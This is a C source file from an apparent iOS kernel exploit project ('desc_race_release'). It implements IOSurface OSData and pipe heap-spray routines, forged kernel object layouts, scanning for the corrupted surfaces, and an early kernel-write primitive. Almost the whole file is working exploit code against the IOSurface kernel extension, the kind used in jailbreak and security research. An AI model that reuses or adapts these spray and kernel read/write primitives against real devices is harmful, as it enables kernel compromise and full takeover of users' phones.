//
//  spray_stuff.c
//  desc_race_release
//
//  Created by b1n4r1b01 on 01/03/22.
//

#include "spray_stuff.h"
#include "iokit.h"

// Thanks to Justin for the OSData code https://github.com/jsherman212/iomfb-exploit
// Thanks to pattern-f for pipe spray and IOSurface API code https://github.com/pattern-f/TQ-pre-jailbreak

struct set_value_spray {
    uint32_t surface_id;
    uint32_t pad;

    /* Serialized XML */
    uint32_t set_value_data[7];

    /* OSData spray data */
    uint8_t osdata_spray[];
};

static uint32_t transpose(uint32_t val){
    uint32_t ret = 0;

    for(size_t i = 0; val > 0; i += 8){
        ret += (val % 255) << i;
        val /= 255;
    }

    return ret + 0x01010101;
}

static uint32_t g_cur_osdata_spray_key = 0;
static struct set_value_spray *g_spray_data_one_page = NULL;
static struct set_value_spray *g_spray_data_two_pages = NULL;
static struct set_value_spray *g_spray_data_three_pages = NULL;
static struct set_value_spray *g_spray_data_four_pages = NULL;
static bool g_osdata_spray_inited = false;

static bool osdata_spray_internal(io_connect_t iosruc,
        int surface_id, uint32_t *keyp, uint8_t *spray_data,
        size_t spray_sz, struct set_value_spray *spray_buf){
    size_t aligned_spray_sz = spray_sz;

    if(spray_sz & 0x3fffuLL)
        aligned_spray_sz = (spray_sz + 0x4000) & ~(0x3fffuLL);

    uint32_t cur_spray_key = transpose(g_cur_osdata_spray_key);

    spray_buf->surface_id = surface_id;
    spray_buf->pad = 0;

    uint32_t *set_value_data = spray_buf->set_value_data;

    *set_value_data++ = kOSSerializeBinarySignature;
    *set_value_data++ = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *set_value_data++ = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
    *set_value_data++ = kOSSerializeSymbol | 5;
    *set_value_data++ = cur_spray_key;
    *set_value_data++ = 0;
    *set_value_data++ = kOSSerializeEndCollection | kOSSerializeData | aligned_spray_sz;

    if (spray_data)
        memcpy(spray_buf->osdata_spray, spray_data, spray_sz);
    else
        memset(spray_buf->osdata_spray, 0x41, spray_sz);
    uint32_t out = 0;
    size_t outsz = sizeof(out);

    kern_return_t kret = IOConnectCallStructMethod(iosruc, 9, spray_buf,
            sizeof(struct set_value_spray) + aligned_spray_sz, &out, &outsz);

    if(kret){
        printf("%s: s_set_value failed: %s\n", __func__,
                mach_error_string(kret));
        return false;
    }

    *keyp = cur_spray_key;

    g_cur_osdata_spray_key++;

    return true;
}

static void osdata_spray_init(void){
    g_spray_data_one_page = malloc(sizeof(struct set_value_spray) + 0x4000);

    if(!g_spray_data_one_page)
        return;

    g_spray_data_two_pages = malloc(sizeof(struct set_value_spray) + 0x8000);

    if(!g_spray_data_two_pages)
        return;

    g_spray_data_three_pages = malloc(sizeof(struct set_value_spray) + 0xc000);

    if(!g_spray_data_three_pages)
        return;

    g_spray_data_four_pages = malloc(sizeof(struct set_value_spray) + 0x10000);

    if(!g_spray_data_four_pages)
        return;

    g_osdata_spray_inited = true;
}


static bool osdata_spray(io_connect_t iosruc, int surface_id,
        uint8_t *data, size_t sz, uint32_t *keyp){
    if(!g_osdata_spray_inited){
        osdata_spray_init();

        if(!g_osdata_spray_inited){
            printf("%s: failed to init osdata spray globals\n", __func__);
            return false;
        }
    }

    struct set_value_spray *spray_buf;

    size_t alloc_size = sz + sizeof(struct set_value_spray);
    spray_buf = malloc(alloc_size);
    if(!spray_buf){
        printf("%s failed to allocate 0x%lX bytes for spray\n", __FUNCTION__, sz);
        return false;
    }
    memset(spray_buf, 0x41, alloc_size);
    

    bool ret = osdata_spray_internal(iosruc, surface_id, keyp, data,
            sz, spray_buf);
    free(spray_buf);
    return ret;
}

static io_connect_t IOSurfaceRootUserClient_uc(void){
    kern_return_t kret = KERN_SUCCESS;
    io_connect_t IOSurfaceRootUserClient_user_client = IO_OBJECT_NULL;
    const char *name = "IOSurfaceRoot";

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(name));

    if(!service){
        printf("%s: IOServiceGetMatchingService returned NULL\n", __func__);
        return IO_OBJECT_NULL;
    }

    int type = 0;
    kret = IOServiceOpen(service, mach_task_self(), type,
            &IOSurfaceRootUserClient_user_client);

    if(kret){
        printf("%s: IOServiceOpen returned %s\n", __func__,
                mach_error_string(kret));
        return IO_OBJECT_NULL;
    }

    return IOSurfaceRootUserClient_user_client;
}

static int create_surface(io_connect_t uc){
    /* Thanks @bazad */
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    };

    struct IOSurfaceLockResult {
        uint8_t _pad1[0x18];
        uint32_t surface_id;
        uint8_t _pad2[0xf60-0x18-0x4];
    };

    struct _IOSurfaceFastCreateArgs create_args = {0};
    create_args.width = 100;
    create_args.height = 100;
    /* below works */
    create_args.pixel_format = 0x42475241;
    create_args.alloc_size = 0;

    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);

    kern_return_t kret = IOConnectCallMethod(uc, 6, NULL, 0, &create_args,
            sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);

    if(kret)
        return -1;

    return lock_result.surface_id;
}
struct array {
    /* The items that make up the array */
    void **items;

    /* How many items the array currently holds */
    unsigned long len;

    /* The amount of memory allocated for this array.
     * Doubles every time a->len >= a->capacity - 1. */
    unsigned long capacity;
};
static const int STARTING_CAPACITY = 1;
struct array *array_new(void){
    struct array *a = malloc(sizeof(struct array));

    a->items = NULL;
    a->len = 0;
    a->capacity = STARTING_CAPACITY;

    return a;
}

uint64_t gPtr = 0;
uint64_t gios = 0;
uint64_t gleak_ptr = 0;

void iosurface_justin_ptr(uint32_t sz, uint64_t ptr, uint64_t ios, uint64_t leak_ptr){
    gPtr = ptr;
    gios = ios;
    gleak_ptr = leak_ptr;
    iosurface_justin(sz);
}

const int iosurface_count = 4094;   //Max surface creation count
const int iosruc_count = 1017;      //Max IOSurfaceRootUserClient count, where each UC has a limit of 4095 surfaces

const int cor_cnt2 = 1000; // 1800 super
int cor_ios2[cor_cnt2] = {0};
io_connect_t gspray_serv = 0;

uint32_t gsp_keys[cor_cnt2] = {0};

void iosurface_justin(uint32_t sz)
{

    const uint32_t spray_sz = sz;
    uint8_t *osdata_spray_buf = malloc(spray_sz);
    for(int i = 0; i < spray_sz; i+=8){
        *(uint64_t*)(osdata_spray_buf + i) = 0xFF00000000000000 + i;
    }
    if (spray_sz == 0x100000)
    {
        for(int i = 0; i < spray_sz; i+=0x4000){

            *(uint32_t*)(osdata_spray_buf + i) = 1;
            *(uint64_t*)(osdata_spray_buf + i + 0x20) = gPtr + 0x40;
            
            *(uint64_t*)(osdata_spray_buf + i + 0x40) = gPtr + 0x48;//0x4141414141414141;
            *(uint64_t*)(osdata_spray_buf + i + 0x48) = gios + 0x5000;//gPtr + 0x50;//0x4242424242424242;
            *(uint64_t*)(osdata_spray_buf + i + 0x58) = gPtr + 0x60;
            *(uint64_t*)(osdata_spray_buf + i + 0x60) = 0;
            *(uint64_t*)(osdata_spray_buf + i + 0x68) = gPtr + 0x40;
            *(uint64_t*)(osdata_spray_buf + i + 0x70) = 0;//gPtr + 0x60;
            
#define VM_obj_off 0x100
            *(uint64_t*)(osdata_spray_buf + i + 0x78) = gPtr + VM_obj_off;
#define IOSurface_off 0x300
            *(uint64_t*)(osdata_spray_buf + i + 0x88) = gPtr + IOSurface_off;
             
            *(uint8_t*)(osdata_spray_buf + i + VM_obj_off + 0x8 + 0x2) = 0x40;
            *(uint32_t*)(osdata_spray_buf + i + VM_obj_off + 0x28) = 2;
            //modifying the below two fields can cause panics in different lock functions
            *(uint64_t*)(osdata_spray_buf + i + VM_obj_off + 0x40) = 0xBBAADDBBAADD;
            *(uint32_t*)(osdata_spray_buf + i + VM_obj_off + 0x74) = 0x8000000;
            
            *(uint64_t*)(osdata_spray_buf + i + IOSurface_off  + 0x360) = gPtr + IOSurface_off  + 0xB4;
            *(uint64_t*)(osdata_spray_buf + i + IOSurface_off  + 0xB4)  = 0xDDDDDDDDDDDDDDDD;
            
        }
    }
    else{
        printf("WARNING this is not going to allocate the desired patterns\n");
    }

    for (int i = 1; i <= 1; i++)
    {
        io_connect_t iosruc = IOSurfaceRootUserClient_uc();
        gspray_serv =iosruc;
        if(!iosruc){
            printf("failed to create %d IOSRUC\n", i);
            return;
        }
        for (int j = 1; j <= cor_cnt2; j++)
        {
            uint32_t key;
            int ios_id = create_surface(iosruc);
                if(ios_id == -1){
                    printf("%s: failed to create IOSurface \n", __func__);
                    return;
                }
            cor_ios2[j - 1] = ios_id;
            if(!osdata_spray(iosruc, ios_id,
                        osdata_spray_buf, spray_sz, &key)){
                printf("\n%s: failed while spraying\n", __func__);
                return;
            }
            else{
                gsp_keys[j -1] = key;
            }
        }
    }

    free(osdata_spray_buf);
    printf("\n");
    return;
}

//https://gist.github.com/richinseattle/c527a3acb6f152796a580401057c78b4

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump_ugh2(void *mem, unsigned int len)
{
        unsigned int i, j;
        
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
        {
                /* print offset */
                if(i % HEXDUMP_COLS == 0)
                {
                        printf("0x%06x: ", i);
                }
 
                /* print hex data */
                if(i < len)
                {
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                }
                else /* end of block, just aligning for ASCII dump */
                {
                        printf("   ");
                }
                
                /* print ASCII dump */
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
                {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
                        {
                                if(j >= len) /* end of block, not really printing */
                                {
                                        putchar(' ');
                                }
                                else if(isprint(((char*)mem)[j])) /* printable char */
                                {
                                        putchar(0xFF & ((char*)mem)[j]);
                                }
                                else /* other char */
                                {
                                        putchar('.');
                                }
                        }
                        putchar('\n');
                }
        }
}

int gOSD_ios = -1;
uint32_t gkey = 0;

int read_back_osdata(void){
    for(int i = 0; i < cor_cnt2; i++){
        uint32_t key = gsp_keys[i];
        uint32_t id = cor_ios2[i];
        void* readback_buf = malloc(0x10 + (1024 * 1024));
        memset(readback_buf, 0, 0x10 + (1024 * 1024));
        uint32_t get_value_input[4];
        memset(get_value_input, 0, sizeof(get_value_input));

        get_value_input[0] = id;
        get_value_input[2] = key;
        size_t readback_buf_sz = 0x10 + (1024 * 1024);

        int kret = IOConnectCallStructMethod(gspray_serv, 10,
                get_value_input, sizeof(get_value_input), readback_buf,
                &readback_buf_sz);

        if(kret){
            printf("%s: failed to read back OSData buffer for key %#x: %s\n",
                    __func__, key, mach_error_string(kret));
            return -1;
        }

        for(int i = 0; i < 0x100000; i+=0x4000){
#define LOL (0x300 + 0xB4)
            if (*(uint64_t*)(readback_buf + i + LOL + 0x10) == 0xAAAAAAAAAAAAAAAA){
                gOSD_ios = id;
                gkey = key;
                return id;
            }
        }
    }
    return -1;
}

void
pipe_close_lib(int pipefds[2]) {
    if(close(pipefds[0]) || close(pipefds[1])){
        printf("can't free pipes?\n");
    }
}


int *
create_pipes_lib(size_t *pipe_count) {
    // Allocate our initial array.
//    printf("%s pipe count: %d\n", __FUNCTION__, *pipe_count);
    size_t capacity = *pipe_count;
    int *pipefds = calloc(2 * capacity, sizeof(int));
    assert(pipefds != NULL);
    // Create as many pipes as we can.
    size_t count = 0;
    for (; count < capacity; count++) {
        // First create our pipe fds.
        int fds[2] = { -1, -1 };
        int error = pipe(fds);
        // Unfortunately pipe() seems to return success with invalid fds once we've
        // exhausted the file limit. Check for this.
        if (error != 0 || fds[0] < 0 || fds[1] < 0) {
            printf("err\n");
            pipe_close_lib(fds);
            break;
        }
        // Mark the write-end as nonblocking.
        //set_nonblock(fds[1]);
        // Store the fds.
        pipefds[2 * count + 0] = fds[0];
        pipefds[2 * count + 1] = fds[1];
    }
    assert(count == capacity && "can't alloc enough pipe fds");
    // Truncate the array to the smaller size.
    int *new_pipefds = realloc(pipefds, 2 * count * sizeof(int));
    assert(new_pipefds != NULL);
    // Return the count and the array.
    *pipe_count = count;
    return new_pipefds;
}

size_t
pipe_spray_lib(const int *pipefds, size_t pipe_count,
        void *pipe_buffer, size_t pipe_buffer_size,
        void (^update)(uint32_t pipe_index, void *data, size_t size)) {
    
    assert(pipe_count <= 0xffffff);
//    assert(pipe_buffer_size > 512);
    size_t write_size = pipe_buffer_size - 1;
    size_t pipes_filled = 0;
    for (size_t i = 0; i < pipe_count; i++) {
        int wfd = pipefds[2 * i + 1];
        ssize_t written = write(wfd, pipe_buffer, write_size);
        printf("");
        if (written != write_size) {
            printf("b: pipe err\n");
            // This is most likely because we've run out of pipe buffer memory. None of
            // the subsequent writes will work either.
            break;
        }
        pipes_filled++;
    }
    return pipes_filled;
}

int *pipefds;
ssize_t gpipe_cnt = 0;

void pipe_spray_adv(uint32_t pipe_size, size_t pipe_count){
    void *pipe_buffer = malloc(pipe_size);
    memset(pipe_buffer, 'P', pipe_size);
    if(!pipe_buffer)
        return;

    pipefds = create_pipes_lib(&pipe_count);
    pipe_spray_lib(pipefds, pipe_count, pipe_buffer, pipe_size, NULL);
    gpipe_cnt = pipe_count;
    free(pipe_buffer);
}


int *pipefds2;
ssize_t gpipe_cnt2 = 0;

void pipe_spray_adv2(uint32_t pipe_size, size_t pipe_count, void *mem){
    void *pipe_buffer = 0;
    if (mem){
        pipe_buffer = mem;
    }
    else{
        void *pipe_buffer = malloc(pipe_size);
        memset(pipe_buffer, 'P', pipe_size);
    }
    if(!pipe_buffer)
        return;

    pipefds2 = create_pipes_lib(&pipe_count);
    pipe_spray_lib(pipefds, pipe_count, pipe_buffer, pipe_size, NULL);
    gpipe_cnt2 = pipe_count;
    free(pipe_buffer);
}


int check_init = 0;
char *check_buffer = 0;

int check_faulty_pipe(void *mem, uint32_t len)
{
    if(!check_init){
        check_buffer = malloc(len);
        memset(check_buffer, 'P', len);
    }
    if (strncmp(check_buffer, mem, len - 1))    // ignore the last byte
        return 1;
    return 0;
}

void *read_pipes(uint32_t read_buffer_sz, int *dat_pipe)
{
    void *read_buffer = malloc(read_buffer_sz);
    for (int i = 0; i < gpipe_cnt; i++)
    {
        bzero(read_buffer, read_buffer_sz);
        int cur_fd = pipefds[2 * i];
        ssize_t ret = read(cur_fd, read_buffer, read_buffer_sz);
        if (ret != read_buffer_sz - 1)
        {
            printf("reading from fd failed ret: %zX\n", ret);
        }
        if (check_faulty_pipe(read_buffer, read_buffer_sz)){
            printf("faulty pipe detected\n");
            *dat_pipe = cur_fd;
            return read_buffer;
        }
    }
    return NULL;
}

void wirte_to_pipe(int dat_pipe, void *data, uint32_t data_size){
    ssize_t ret = write(dat_pipe + 1, data, data_size);
    if (ret != data_size){
        printf("failed to write data to pipe %d\n", dat_pipe + 1);
        return;
    }
    return;
}

void read_from_pipe(int dat_pipe, void *data, uint32_t data_size){
    ssize_t ret = read(dat_pipe, data, data_size);
    if (ret != data_size){
        printf("read failed\n");
        return;
    }
}

void close_pipes(){
    for(int i = 0; i < gpipe_cnt; i++)
    {
        pipe_close_lib(pipefds + (2 * i));
    }
}

void close_pipes_except(int read_pipe){
    for(int i = 0; i < gpipe_cnt; i++)
    {
        int *a = pipefds + (2 * i);
        if (a[0] != read_pipe)
            pipe_close_lib(pipefds + (2 * i));
    }
}

int gserv = 0;
const int cor_ios_cnt = 2000;
int corrupt_ios[cor_ios_cnt] = {0};
io_connect_t gcorrupt_ios_serv = 0;
const int lol_cnt =4000;
int lol_idk[lol_cnt] = {0};
io_connect_t glol_serv = 0;

void iosurface_stuff(void)
{
    for (int i = 0; i < 1; i++){
        io_connect_t iosruc1 = IOSurfaceRootUserClient_uc();
        gcorrupt_ios_serv = iosruc1;
                for(int j = 0; j < cor_ios_cnt; j++)
                    corrupt_ios[j] = create_surface(iosruc1);
    }
    
    io_connect_t iosruc1 = IOSurfaceRootUserClient_uc();
    glol_serv = iosruc1;
    for (int i = 0; i < lol_cnt; i++)
        lol_idk[i] = create_surface(iosruc1);
    return;
}

void close_surface_pro(io_connect_t serv, int sid)
{
   uint64_t inSc[1] = {sid};
    IOConnectCallScalarMethod(serv, 1, inSc, 1, 0, 0);
}

void iosurface_s_set_indexed_timestamp(io_connect_t service, uint64_t v,int id)
{
    uint64_t i_scalar[3] = {
        id, // fixed, first valid client obj
        0, // index
        v, // value
    };
    uint32_t i_count = 3;

    kern_return_t kr = IOConnectCallMethod(
            service,
            33, // s_set_indexed_timestamp
            i_scalar, i_count,
            NULL, 0,
            NULL, NULL,
            NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("s_set_indexed_timestamp error: 0x%x\n", kr);
    }
}


uint32_t iosurface_s_get_ycbcrmatrix(io_connect_t service, int id)
{
    uint64_t i_scalar[1] = { id }; // fixed, first valid client obj
    uint64_t o_scalar[1];
    uint32_t i_count = 1;
    uint32_t o_count = 1;

    kern_return_t kr = IOConnectCallMethod(
            service,
            8, // s_get_ycbcrmatrix
            i_scalar, i_count,
            NULL, 0,
            o_scalar, &o_count,
            NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("s_get_ycbcrmatrix error: 0x%x\n", kr);
        return 0;
    }
    if (o_scalar[0]){
        return (uint32_t)o_scalar[0];
    }
    return 0;
}

// In case writes are failing you can spray more OSData allocs using the same SurfaceID to increase chances of reliability

const int early_spray_cnt = 200;
int disposable_surfaces[early_spray_cnt] = {0};

void early_kwrite64(int sid, int rwid, uint64_t addr, uint64_t value){
    uint32_t spray_sz = 0x100000;
    void *osdata_spray_buf = malloc(spray_sz);
    for(int i = 0; i < spray_sz; i+=0x4000){
        *(uint64_t*)(osdata_spray_buf + i + 0x88) = gPtr + IOSurface_off;
        *(uint64_t*)(osdata_spray_buf + i + IOSurface_off + 0x360) = addr;
    }
    
    uint64_t delete_in[] = { (uint64_t)sid, gkey, 0 };
    uint8_t delete_out[4];
    size_t delete_outcnt = sizeof(delete_out);
    int ret = IOConnectCallStructMethod(gspray_serv, 11, delete_in, sizeof(delete_in), delete_out, &delete_outcnt);
    if(ret){
        printf("failed to delete OSData ret: %X\n", ret);
        return;
    }

//    for(int i = 0; i < early_spray_cnt; i++)
    {
        if(!osdata_spray(gspray_serv, sid,
                    osdata_spray_buf, spray_sz, &gkey)){
            printf("\n%s: failed while spraying\n", __func__);
            return;
        }
    }
    iosurface_s_set_indexed_timestamp(glol_serv, value, rwid);
}


void yeet_ios(){
    
    int rwid = -1;
    for (int i = 0; i < lol_cnt; i++){
        iosurface_s_set_indexed_timestamp(glol_serv, 0xAAAAAAAAAAAAAAAA, lol_idk[i]);
        uint32_t read = iosurface_s_get_ycbcrmatrix(glol_serv, lol_idk[i]);
        if (read == 0xAAAAAAAA){
            printf("r/w iosurfaceid : %d\n", lol_idk[i]);
            rwid = lol_idk[i];
        }
    }

// this checking loop isn't required
//    for (int i = 0; i < cor_ios_cnt; i++){
//        iosurface_s_set_indexed_timestamp(gcorrupt_ios_serv, 0xAAAAAAAAAAAAAAAA, corrupt_ios[i]);
//        uint32_t read = iosurface_s_get_ycbcrmatrix(gcorrupt_ios_serv, corrupt_ios[i]);
//        if (read){
//            printf("2 our iosurfaceid : %d (read: 0x%X)\n", corrupt_ios[i], read);
//        }
//    }
//
//    for (int i = 0; i < cor_cnt2; i++){
//        iosurface_s_set_indexed_timestamp(gspray_serv, 0xAAAAAAAAAAAAAAAA, cor_ios2[i]);
//        uint32_t read = iosurface_s_get_ycbcrmatrix(gspray_serv, cor_ios2[i]);
//        if (read){
//            printf("r/w iosurfaceid : %d (read: 0x%X)\n", lol_idk[i], read);
//        }
//    }
    if(read_back_osdata() == -1){
        printf("failed to find OSData spray IOSurface. We probably overwrote a NULL IOSurfaceClient ptr\n");
        return;
    }
    printf("spray iosurfaceid: %d\n", gOSD_ios);

    sleep(2);
    early_kwrite64(gOSD_ios, rwid, 0x4141414141414141, 0x4242424242424242);
    
}
